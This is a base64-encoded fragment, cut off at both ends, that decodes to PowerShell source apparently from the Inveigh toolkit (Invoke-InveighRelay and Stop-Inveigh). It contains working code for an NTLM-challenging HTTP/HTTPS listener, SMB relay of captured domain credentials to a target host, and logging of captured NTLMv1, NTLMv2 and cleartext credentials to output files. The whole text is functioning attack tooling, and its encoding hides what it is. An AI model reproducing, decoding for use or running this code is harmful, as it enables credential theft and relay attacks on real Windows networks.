y5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IGF1dGhlbnRpY2F0aW9uIGZhaWxlZCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CUmVsYXlfZmFpbGVkX2xpc3QgKz0gIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nICRTTUJSZWxheVRhcmdldCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiTlRMTXYxIFNNQiByZWxheSBub3QgeWV0IHN1cHBvcnRlZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIE5UTE12MSByZWxheSBub3QgeWV0IHN1cHBvcnRlZCIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJBYm9ydGluZyByZWxheSBzaW5jZSAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBoYXMgYWxyZWFkeSBiZWVuIHRyaWVkIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gQWJvcnRpbmcgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaGFzIGFscmVhZHkgYmVlbiB0cmllZCBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJBYm9ydGluZyByZWxheSBzaW5jZSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGFwcGVhcnMgdG8gYmUgYSBtYWNoaW5lIGFjY291bnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gQWJvcnRpbmcgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV91c2VyX3N0cmluZyBhcHBlYXJzIHRvIGJlIGEgbWFjaGluZSBhY2NvdW50IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBub3Qgb24gcmVsYXkgdXNlcm5hbWUgbGlzdCIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG5vdCBvbiByZWxheSB1c2VybmFtZSBsaXN0IildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkTlRMTSA9ICdOVExNJwogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFtieXRlW11dICRIVFRQX2J1ZmZlciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGludmVpZ2gubWVzc2FnZSkKICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5Db250ZW50TGVuZ3RoNjQgPSAkSFRUUF9idWZmZXIubGVuZ3RoCiAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuQWRkSGVhZGVyKCJXV1ctQXV0aGVudGljYXRlIiwkTlRMTSkKICAgICAgICAkSFRUUF9zdHJlYW0gPSAkaW52ZWlnaC5yZXNwb25zZS5PdXRwdXRTdHJlYW0KICAgICAgICAkSFRUUF9zdHJlYW0ud3JpdGUoJEhUVFBfYnVmZmVyLCAwLCAkSFRUUF9idWZmZXIubGVuZ3RoKQogICAgICAgICRIVFRQX3N0cmVhbS5jbG9zZSgpCgogICAgfQoKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuU3RvcCgpCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLkNsb3NlKCkKfQoKJGNvbnRyb2xfcmVsYXlfc2NyaXB0YmxvY2sgPSAKewogICAgcGFyYW0gKCRSdW5UaW1lKQoKICAgIGlmKCRSdW5UaW1lKQogICAgeyAgICAKICAgICAgICAkY29udHJvbF90aW1lb3V0ID0gbmV3LXRpbWVzcGFuIC1NaW51dGVzICRSdW5UaW1lCiAgICAgICAgJGNvbnRyb2xfc3RvcHdhdGNoID0gW2RpYWdub3N0aWNzLnN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKICAgIH0KICAgICAgIAogICAgd2hpbGUgKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCiAgICB7CgogICAgICAgIGlmKCRSdW5UaW1lKQogICAgICAgIHsgICAgCiAgICAgICAgICAgIGlmKCRjb250cm9sX3N0b3B3YXRjaC5lbGFwc2VkIC1nZSAkY29udHJvbF90aW1lb3V0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLklzTGlzdGVuaW5nKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuU3RvcCgpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5DbG9zZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIkludmVpZ2ggUmVsYXkgZXhpdGVkIGR1ZSB0byBydW4gdGltZSBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIFJlbGF5IGV4aXRlZCBkdWUgdG8gcnVuIHRpbWUiKV0pCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5yZWxheV9ydW5uaW5nID0gJGZhbHNlCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guSFRUUFMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJiAibmV0c2giIGh0dHAgZGVsZXRlIHNzbGNlcnQgaXBwb3J0PTAuMC4wLjA6NDQzID4gJG51bGwKICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlTdG9yZSgiTXkiLCJMb2NhbE1hY2hpbmUiKQogICAgICAgICAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuT3BlbignUmVhZFdyaXRlJykKICAgICAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlID0gJGNlcnRpZmljYXRlX3N0b3JlLmNlcnRpZmljYXRlcy5maW5kKCJGaW5kQnlUaHVtYnByaW50IiwkaW52ZWlnaC5jZXJ0aWZpY2F0ZV90aHVtYnByaW50LCRmYWxzZSlbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLlJlbW92ZSgkY2VydGlmaWNhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5zdGF0dXNfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5IikKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSJ8IE91dC1GaWxlICRJbnZlaWdoLmxvZ19vdXRfZmlsZSAtQXBwZW5kICAgCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9ICAgICAKCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQID0gJGZhbHNlCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCAtYW5kICghJGludmVpZ2gucnVubmluZyAtb3IgISRpbnZlaWdoLmJydXRlZm9yY2VfcnVubmluZykpCiAgICAgICAgewogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2gubG9nX291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfZmlsZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZVswXXxPdXQtRmlsZSAkaW52ZWlnaC5OVExNdjJfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2ZpbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5jbGVhcnRleHRfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2guY2xlYXJ0ZXh0X291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNsZWFydGV4dF9maWxlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgfQogfQoKIyBIVFRQL0hUVFBTIExpc3RlbmVyIFN0YXJ0dXAgRnVuY3Rpb24gCkZ1bmN0aW9uIEhUVFBMaXN0ZW5lcigpCnsKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cExpc3RlbmVyCgogICAgaWYoJGludmVpZ2guSFRUUCkKICAgIHsKICAgICAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlByZWZpeGVzLkFkZCgnaHR0cDovLyo6ODAvJykKICAgIH0KCiAgICBpZigkaW52ZWlnaC5IVFRQUykKICAgIHsKICAgICAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlByZWZpeGVzLkFkZCgnaHR0cHM6Ly8qOjQ0My8nKQogICAgfQoKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuQXV0aGVudGljYXRpb25TY2hlbWVzID0gIkFub255bW91cyIgCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlN0YXJ0KCkKICAgICRIVFRQX3J1bnNwYWNlID0gW3J1bnNwYWNlZmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICRIVFRQX3J1bnNwYWNlLk9wZW4oKQogICAgJEhUVFBfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJEhUVFBfcG93ZXJzaGVsbCA9IFtwb3dlcnNoZWxsXTo6Q3JlYXRlKCkKICAgICRIVFRQX3Bvd2Vyc2hlbGwuUnVuc3BhY2UgPSAkSFRUUF9ydW5zcGFjZQogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJHNoYXJlZF9iYXNpY19mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfcmVsYXlfY2hhbGxlbmdlX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X3Jlc3BvbnNlX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X2V4ZWN1dGVfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfTlRMTV9mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRIVFRQX3NjcmlwdGJsb2NrKS5BZGRBcmd1bWVudCgKICAgICAgICAkU01CUmVsYXlUYXJnZXQpLkFkZEFyZ3VtZW50KCRTTUJSZWxheUNvbW1hbmQpLkFkZEFyZ3VtZW50KCRTTUJSZWxheVVzZXJuYW1lcykuQWRkQXJndW1lbnQoCiAgICAgICAgJFNNQlJlbGF5QXV0b0Rpc2FibGUpLkFkZEFyZ3VtZW50KCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0KS5BZGRBcmd1bWVudCgKICAgICAgICAkTWFjaGluZUFjY291bnRzKS5BZGRBcmd1bWVudCgkV1BBREF1dGgpID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KCiMgQ29udHJvbCBSZWxheSBTdGFydHVwIEZ1bmN0aW9uCkZ1bmN0aW9uIENvbnRyb2xSZWxheUxvb3AoKQp7CiAgICAkY29udHJvbF9yZWxheV9ydW5zcGFjZSA9IFtydW5zcGFjZWZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkY29udHJvbF9yZWxheV9ydW5zcGFjZS5PcGVuKCkKICAgICRjb250cm9sX3JlbGF5X3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwgPSBbcG93ZXJzaGVsbF06OkNyZWF0ZSgpCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLlJ1bnNwYWNlID0gJGNvbnRyb2xfcmVsYXlfcnVuc3BhY2UKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkY29udHJvbF9yZWxheV9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoJFJ1blRpbWUpID4gJG51bGwKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KCiMgSFRUUCBTZXJ2ZXIgU3RhcnQKaWYoJGludmVpZ2guSFRUUCAtb3IgJGludmVpZ2guSFRUUFMpCnsKICAgIEhUVFBMaXN0ZW5lcgp9CgojIENvbnRyb2wgUmVsYXkgTG9vcCBTdGFydAppZigkUnVuVGltZSAtb3IgJGludmVpZ2guZmlsZV9vdXRwdXQpCnsKICAgIENvbnRyb2xSZWxheUxvb3AKfQoKaWYoISRpbnZlaWdoLnJ1bm5pbmcgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKewoKICAgIDpjb25zb2xlX2xvb3Agd2hpbGUoJGludmVpZ2gucmVsYXlfcnVubmluZyAtYW5kICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0KQogICAgewogICAgICAgIHdoaWxlKCRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgewogICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHdyaXRlLW91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc3dpdGNoIC13aWxkY2FyZCAoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAiSW52ZWlnaCAqZXhpdGVkICoiCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICIqIHdyaXR0ZW4gdG8gKiIKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICIqIGZvciByZWxheSAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiKlNNQiByZWxheSAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiKiBsb2NhbCBhZG1pbmlzdHJhdG9yICoiCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB3cml0ZS13YXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLW91dHB1dCAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgIH0gICAKICAgICAgICB9CgogICAgICAgIGlmKCRpbnZlaWdoLmNvbnNvbGVfaW5wdXQpCiAgICAgICAgewogICAgICAgICAgICBpZihbY29uc29sZV06OktleUF2YWlsYWJsZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9vdXRwdXQgPSAkZmFsc2UKICAgICAgICAgICAgICAgIEJSRUFLIGNvbnNvbGVfbG9vcAogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICB9Cn0KCn0KI0VuZCBJbnZva2UtSW52ZWlnaFJlbGF5CgpGdW5jdGlvbiBTdG9wLUludmVpZ2gKewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgU3RvcC1JbnZlaWdoIHdpbGwgc3RvcCBhbGwgcnVubmluZyBJbnZlaWdoIGZ1bmN0aW9ucy4KICAgICM+CiAgICBpZigkaW52ZWlnaCkKICAgIHsKICAgICAgICBpZigkaW52ZWlnaC5ydW5uaW5nIC1vciAkaW52ZWlnaC5yZWxheV9ydW5uaW5nIC1vciAkaW52ZWlnaC5icnV0ZWZvcmNlX3J1bm5pbmcpCiAgICAgICAgewoKICAgICAgICAgICAgaWYoJGludmVpZ2guSFRUUF9saXN0ZW5lci5Jc0xpc3RlbmluZykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5TdG9wKCkKICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuQ2xvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkaW52ZWlnaC5icnV0ZWZvcmNlX3J1bm5pbmcpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmJydXRlZm9yY2VfcnVubmluZyA9ICRmYWxzZQogICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBBdHRlbXB0aW5nIHRvIHN0b3AgSFRUUCBsaXN0ZW5lciIpfE91dC1OdWxsCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLnNlcnZlci5ibG9ja2luZyA9ICRmYWxzZQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLXMgMQogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5zZXJ2ZXIuQ2xvc2UoKQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLXMgMQogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5TdG9wKCkKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIkludmVpZ2ggQnJ1dGUgRm9yY2UgZXhpdGVkIGF0ICQoR2V0LURhdGUgLWZvcm1hdCAncycpIil8T3V0LU51bGwKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBCcnV0ZSBGb3JjZSBleGl0ZWQiKXxPdXQtTnVsbAoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggQnJ1dGUgRm9yY2UgZXhpdGVkInwgT3V0LUZpbGUgJEludmVpZ2gubG9nX291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2gucmVsYXlfcnVubmluZyA9ICRmYWxzZQogICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHV